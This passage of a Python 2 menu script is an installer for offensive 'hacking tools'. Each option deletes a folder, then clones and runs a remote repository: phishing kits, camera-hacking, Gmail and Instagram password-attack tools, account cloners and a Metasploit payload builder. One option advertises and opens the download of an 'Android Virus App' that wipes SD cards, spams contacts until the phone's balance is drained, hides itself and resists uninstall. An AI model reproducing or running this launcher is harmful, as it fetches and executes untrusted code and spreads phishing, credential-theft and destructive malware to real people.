    elif black == 'D4' or black == 'd4':
        clear()
        print logod4
        os.system('rm -rf $HOME/BlackMafia-Server/')
        os.system('cd $HOME && git clone https://github.com/lovehacker404/BlackMafia-Server/')
        os.system('cd $HOME/BlackMafia-Server && chmod 777 * && ./Android-Setup.sh')
    elif black == 'E5' or black == 'e5':
        clear()
        print logoe5
        os.system('apt install php -y')
        os.system('apt install curl -y')
        os.system('rm -rf $HOME/CameraHack/')
        os.system('cd $HOME && git clone https://github.com/lovehacker404/CameraHack/')
        os.system('cd $HOME/CameraHack && chmod +x lovehacker.sh ngrok && bash lovehacker.sh')
    elif black == 'F6' or black == 'f6':
        clear()
        print logof6
        os.system('rm -rf $HOME/BlackMafiaA')
        os.system('cd $HOME && git clone https://github.com/lovehacker404/BlackMafiaA')
        os.system('cd $HOME/BlackMafiaA && python2 lovehackerA.py')
    elif black == 'G7' or black == 'g7':
        clear()
        print logog7
        os.system('rm -rf $HOME/Phishing')
        os.system('cd $HOME && git clone https://github.com/lovehacker404/Phishing')
        os.system('cd $HOME/Phishing && bash BlackMafia.sh')
    elif black == 'A' or black == 'a':
        clear()
        print logoa
        os.system('rm -rf $HOME/random')
        os.system('cd $HOME && git clone https://github.com/lovehacker404/random')
        os.system('cd $HOME/random && python2 lovehacker.py')
    elif black == 'B' or black == 'b':
        clear()
        print logob
        os.system('rm -rf $HOME/email')
        os.system('cd $HOME && git clone https://github.com/lovehacker404/email')
        os.system('cd $HOME/email && python2 lovehacker.py')
    elif black == 'C' or black == 'c':
        clear()
        print logoc
        os.system('rm -rf $HOME/Password')
        os.system('cd $HOME && git clone https://github.com/lovehacker404/Password')
        os.system('cd $HOME/Password && python2 lovehacker.py')
    elif black == 'D' or black == 'd':
        clear()
        print logod
        os.system('rm -rf $HOME/lovehack')
        os.system('cd $HOME && git clone https://github.com/lovehacker404/lovehack')
        os.system('cd $HOME/lovehack && python2 lovehacker.py')
    elif black == 'E' or black == 'e':
        clear()
        print logoe
        os.system('rm -rf $HOME/402')
        love('\x1b[1;93mTool User Name :\x1b[1;95m     Black ')
        love('\x1b[1;93mTool Password  :\x1b[1;95m     Mafia ')
        time.sleep(5)
        os.system('cd $HOME && git clone https://github.com/lovehacker404/402')
        os.system('cd $HOME/402 && python2 Cloningx-2-1.py')
    elif black == 'F' or black == 'f':
        clear()
        print logof
        os.system('rm -rf $HOME/blackhole')
        love('\x1b[1;93mTool User Name :\x1b[1;95m     Black ')
        love('\x1b[1;93mTool Password  :\x1b[1;95m     Mafia ')
        love('\x1b[1;93m        :Target Attack  :     ')
        love('\x1b[1;93mPassword list  :\x1b[1;95mlovehacker-2.txt ')
        time.sleep(5)
        os.system('cd $HOME && git clone https://github.com/lovehacker404/blackhole')
        os.system('cd $HOME/blackhole && python2 AsifJaved.py')
    elif black == 'G' or black == 'g':
        clear()
        print logog
        os.system('rm -rf $HOME/Spider')
        love('\x1b[1;91mCongratulations Cobra Tool Has Been Installed Successfully')
        love('Now you can open this tool as usual')
        love('\x1b[1;93mTool User Name SpiderMan Password lovehacker')
        time.sleep(5)
        os.system('cd $HOME && git clone https://github.com/lovehacker404/Spider')
        os.system('cd $HOME/Spider && python2 SpiderMan.py')
    elif black == 'H' or black == 'h':
        clear()
        print logoh
        os.system('rm -rf $HOME/KaliIndia')
        love('\x1b[1;96mCongratulations BlackMafia Tool Has Been Installed Successfully')
        love('Now you can open this tool as usual')
        love('\x1b[1;93mTool User Name India Password lovehacker')
        time.sleep(5)#alamin
        os.system('cd $HOME && git clone https://github.com/lovehacker404/KaliIndia')
        os.system('cd $HOME/KaliIndia && python2 kalilinux.India.py')
    elif black == 'I' or black == 'i':
        clear()
        print logoi
        os.system('rm -rf $HOME/BlackHat')
        love('\x1b[1;96mCongratulations BlackHat Tool Has Been Installed Successfully')
        love('Now you can open this tool as usual')
        love('\x1b[1;93mTool User Name BlackHat Password lovehacker')
        time.sleep(5)
        os.system('cd $HOME && git clone https://github.com/lovehacker404/BlackHat')
        os.system('cd $HOME/BlackHat && python2 BlackHat.py')
    elif black == 'J' or black == 'j':
        clear()
        print logoj
        os.system('rm -rf $HOME/RedMoonNew')
        love('\x1b[1;91mCongratulations RedMoonNew Tool Has Been Installed Successfully')
        love('Now you can open this tool as usual')
        love('\x1b[1;93mTool User Name\x1b[1;92m RedMoonNew\x1b[1;93m Password \x1b[1;92mlovehacker')
        time.sleep(5)
        os.system('cd $HOME && git clone https://github.com/lovehacker404/RedMoonNew')
        os.system('cd $HOME/RedMoonNew && python2 lovehacker')
    elif black == 'K' or black == 'k':
        clear()
        print logok
        os.system('rm -rf $HOME/lov3Hak3r')
        love('\x1b[1;96mCongratulations BlackMafia Tool Has Been Installed Successfully')
        love('Now you can open this tool as usual')
        time.sleep(5)
        os.system('cd $HOME && git clone https://github.com/lovehacker404/lov3Hak3r')
        os.system('cd $HOME/lov3Hak3r && python2 lovehacker.py')
    elif black == 'L' or black == 'l':
        clear()
        print logol
        os.system('rm -rf $HOME/Cobra')
        love('\x1b[1;93mCongratulations Cobra Tool Has Been Installed Successfully')
        love('Now you can open this tool as usual')
        love('\x1b[1;95mTool User Name Cobra  Password lovehacker')
        time.sleep(5)
        os.system('cd $HOME && git clone https://github.com/lovehacker404/Cobra')
        os.system('cd $HOME/Cobra && python2 Scorpion.py')
    elif black == 'M' or black == 'm':
        clear()
        print logom
        os.system('rm -rf $HOME/Dragon')
        love('\x1b[1;91mCongratulations Dragon Tool Has Been Installed Successfully')
        love('Now you can open this tool as usual')
        love('\x1b[1;96mTool User Name Dragon  Password lovehacker')
        time.sleep(5)
        os.system('cd $HOME && git clone https://github.com/lovehacker404/Dragon')
        os.system('cd $HOME/Dragon && python2 lovehacker.py')
    elif black == 'N' or black == 'n':
        clear()#Hunterboy
        print logon
        os.system('rm -rf $HOME/NetHunting')
        love('\x1b[1;96mCongratulations NetHunting Tool Has Been Installed Successfully')
        love('Now you can open this tool as usual')
        love('\x1b[1;92mTool User Name linux Password lovehacker')
        time.sleep(5)
        os.system('cd $HOME && git clone https://github.com/lovehacker404/NetHunting')
        os.system('cd $HOME/NetHunting && python2 NetHunting.py')
    elif black == 'O' or black == 'o':
        clear()
        print logoo
        os.system('pkg install unstable-repo')
        os.system('pkg install metasploit')
        os.system('pkg install msfconsole')
        os.system('rm -rf $HOME/Black_Mafia')
        love('\x1b[1;93mCongratulations Black_Mafia Payload Tool Has Been Installed Successfully')
        love('Now you can open this tool as usual')
        time.sleep(5)
        os.system('cd $HOME && git clone https://github.com/lovehacker404/Black_Mafia')
        os.system('cd $HOME/Black_Mafia && python3 Black_Mafia.py')
    elif black == 'P' or black == 'p':
        clear()
        print logop
        os.system('rm -rf $HOME/Pak')
        love('\x1b[1;96mCongratulations CamHacker Tool Has Been Installed Successfully')
        love('Now you can open this tool as usual')
        love('\x1b[1;92mEducational Perpose only')
        time.sleep(2)
        os.system('cd $HOME && git clone https://github.com/lovehacker404/Pak')
        os.system('cd $HOME/Pak && python lovehacker.py')
    elif black == 'Q' or black == 'q':
        clear()
        print logoq
        os.system('pkg install nano')
        os.system('rm -rf $HOME/Compile')
        love('\x1b[1;93mCongratulations  Tool Has Been Update Successfully')
        love('Now you can open this tool as usual')
        time.sleep(5)
        os.system('cd $HOME && git clone https://github.com/lovehacker404/Compile')
        os.system('cd $HOME/Compile && python2 lovehacker.py')
    elif black == 'R' or black == 'r':
        clear()
        print logor
        os.system('pip2 install bs4')
        os.system('rm -rf $HOME/Insta')
        love('\x1b[1;93mCongratulations  Tool Has Been Update Successfully')
        love('Now you can open this tool as usual')
        love('Passwordlist No1 (wordlist.txt) No2 (BlackMafia.txt)')
        time.sleep(5)
        os.system('cd $HOME && git clone https://github.com/lovehacker404/Insta')
        os.system('cd $HOME/Insta && python2 lovehacker.py')
    elif black == 'S' or black == 's':
        clear()
        print logos
        love('\x1b[1;93mCongratulations  Tool Has Been Update Successfully')
        love('Now you can open this tool as usual')
        os.system('rm -rf $HOME/TimePass')
        os.system('cd $HOME && git clone https://github.com/lovehacker404/TimePass')
        time.sleep(4)
        os.system('cd $HOME/TimePass && python2 lovehacker.py')
    elif black == 'T' or black == 't':
        clear()
        print logot
        os.system('rm -rf $HOME/GmailAttack')
        love('\x1b[1;96mCongratulations GmailAttack Tool Has Been Installed Successfully')
        love('Now you can open this tool as usual')
        love('plz wi8 Password list name (lovehacker-1.txt) ')
        time.sleep(4)#Hunterboy_alamin
        os.system('cd $HOME && git clone https://github.com/lovehacker404/GmailAttack')
        os.system('cd $HOME/GmailAttack && python2 lovehacker.py')
    elif black == 'U' or black == 'u':
        clear()
        print logou
        os.system('rm -rf $HOME/Logo')
        love('\x1b[1;96mCongratulations BlackMafia Logo  Tool Has Been Installed Successfully')
        love('Now you can open this tool as usual')
        time.sleep(1)
        os.system('cd $HOME && git clone https://github.com/lovehacker404/Logo')
        os.system('cd $HOME/Logo && bash lovehacker.sh')
    elif black == 'V' or black == 'v':
        clear()
        print logov
        os.system('rm -rf $HOME/sms')
        os.system('cd $HOME && git clone https://github.com/lovehacker404/sms')
        os.system('cd $HOME/sms && bash BlackMafia.sh')
    elif black == 'W' or black == 'w':
        clear()
        print logow
        love('Welcome To BlackMafia WhatsApp Group')
        time.sleep(3)
        os.system('xdg-open https://chat.whatsapp.com/GRSqE9DEA500gQIBsfatWi')
    elif black == 'X' or black == 'x':
        clear()
        print logox
        love('BlackMafia Android Virus App')
        love('\x1b[1;96mSlect Chrome Browser & Download App ')
        love("\xe2\x9a\xa0\xef\xb8\x8fBlackMafia Android Virus Features :\xe2\x9b\x94Send sms continuously from the device to all phone contacts randomly till mobile balance is nill \xe2\x9b\x94Block sms messenger, etc apps. \xe2\x9b\x94Wipe out sd-card data completely. \xe2\x9b\x94Hide app icon from app launcher as well as recent category. \xe2\x9b\x94Cannot uninstalling this virus app from application manager. \xe2\x9b\x94Run in background continuously and gets restarted even after device is turned ON/OFF. \xe2\x9b\x94Track the user's interaction by retrieving the applications that user has started.")
        time.sleep(5)
        os.system('xdg-open https://github.com/lovehacker404/BlackMafia.App/blob/main/BlackMafia.apk')
    elif black == 'Y' or black == 'y':
        clear()
        print logoy
        os.system('rm -rf $HOME/World')
        love('\x1b[1;96mCongratulations BlackMafia Tool Has Been Update Successfully')
        time.sleep(3)
        os.system('cd $HOME && git clone https://github.com/lovehacker404/World')
        os.system('cd $HOME/World && python2 Cloning.py')
    elif black == 'Z' or black == 'z':
        print logoz
        os.system('exit')


if __name__ == '__main__':
    menu()
